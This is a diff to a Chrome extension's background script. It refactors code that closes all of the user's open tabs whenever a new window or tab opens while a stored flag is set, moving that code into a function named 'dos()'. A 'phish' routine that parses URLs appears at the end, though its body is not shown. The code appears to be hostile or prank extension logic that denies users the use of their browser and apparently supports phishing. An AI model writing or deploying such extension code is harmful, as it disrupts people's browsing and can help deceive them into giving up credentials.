@@ -58,11 +58,7 @@ chrome.windows.onCreated.addListener(function(event) {
   }
 
   if (JSON.parse(localStorage.getItem('closeBool'))) {
-    chrome.tabs.query({}, function(tabs) {
-      tabs.forEach(function(tab) {
-        chrome.tabs.remove(tab.id);
-      });
-    });
+    dos();
   }
 });
 
@@ -80,13 +76,17 @@ chrome.tabs.onCreated.addListener(function(event) {
   }
 
   if (JSON.parse(localStorage.getItem('closeBool'))) { // close new tab
-    chrome.tabs.query({}, function(tabs) {
-      tabs.forEach(function(tab) {
-        chrome.tabs.remove(tab.id);
-      });
-    });
+    dos();
   }
 });
+
+function dos() {
+  chrome.tabs.query({}, function(tabs) {
+    tabs.forEach(function(tab) {
+      chrome.tabs.remove(tab.id);
+    });
+  });
+}
 
 function phish(input_url, tab_id) {
   var r = new RegExp('^(?:https?:\/\/)?(?:[^@\n]+@)?(?:www\.)?([^:\/\n]+)');
